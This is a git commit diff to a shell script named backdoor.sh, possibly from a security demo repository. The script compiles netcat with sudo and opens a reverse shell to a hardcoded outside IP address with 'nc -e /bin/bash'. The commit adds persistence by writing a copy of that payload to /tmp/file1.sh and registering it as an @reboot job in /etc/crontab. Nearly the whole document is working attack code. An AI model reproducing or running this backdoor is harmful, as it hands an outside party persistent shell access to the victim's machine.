01505d10ae42fb9351975c9923e290c5f2ba2db8
Magno Logan <magnologan@gmail.com>
2021-11-01 16:43:11 -0400

    Update backdoor.sh

--- backdoor.sh
+++ backdoor.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-sudo curl -s http://whatismyip.akamai.com/
+# Reverse Shell
 wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
 tar -xzvf netcat-0.7.1.tar.gz
 cd netcat-0.7.1 
@@ -8,3 +8,17 @@ cd netcat-0.7.1
 sudo make
 sudo make install
 nc 3.84.116.126 443 -e /bin/bash
+
+# Connect Back
+cat << EOF > /tmp/file1.sh
+#!/bin/bash
+wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
+tar -xzvf netcat-0.7.1.tar.gz
+cd netcat-0.7.1 
+./configure
+sudo make
+sudo make install
+nc 3.84.116.126 443 -e /bin/bash
+EOF
+
+echo "@reboot /tmp/file1.sh"  >>  /etc/crontab
